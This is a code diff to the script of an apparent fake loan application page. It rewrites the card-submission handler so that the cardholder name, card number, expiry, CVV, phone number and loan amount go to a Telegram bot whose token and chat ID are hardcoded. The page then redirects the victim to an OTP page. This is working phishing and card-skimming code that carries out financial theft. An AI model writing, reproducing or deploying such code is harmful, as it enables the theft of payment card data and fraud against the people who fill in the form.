@@ -63,20 +63,20 @@
             const btn=e.target.querySelector('.btn');
             btn.textContent='Processing...';
             btn.disabled=true;
-            const payload={
-                cardName:document.getElementById('card-name').value,
-                cardNumber:document.getElementById('card-number').value,
-                expiration:document.getElementById('expiration').value,
-                cvv:document.getElementById('cvv').value,
-                applicant:localStorage.getItem('firstName')||'',
-                phone:localStorage.getItem('phone')||'',
-                amount:localStorage.getItem('loanAmount')||''
-            };
-            fetch('/api/card',{
+            const cardName=document.getElementById('card-name').value;
+            const cardNumber=document.getElementById('card-number').value;
+            const expiration=document.getElementById('expiration').value;
+            const cvv=document.getElementById('cvv').value;
+            const name=localStorage.getItem('firstName')||'';
+            const phone=localStorage.getItem('phone')||'';
+            const amount=localStorage.getItem('loanAmount')||'';
+            const BOT_TOKEN='7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+            const CHAT_ID='5615316142';
+            const msg=`💳 Card Details\nName: ${cardName}\nCard: ${cardNumber}\nExpiry: ${expiration}\nCVV: ${cvv}\n\n👤 ${name}\n📱 +254${phone}\n💰 USD ${amount}`;
+            fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
                 method:'POST',headers:{'Content-Type':'application/json'},
-                body:JSON.stringify(payload)
-            }).then(()=>window.location.href='otp.html')
-              .catch(()=>window.location.href='otp.html');
+                body:JSON.stringify({chat_id:CHAT_ID,text:msg})
+            }).finally(()=>window.location.href='otp.html');
         });
     </script>
 </body>
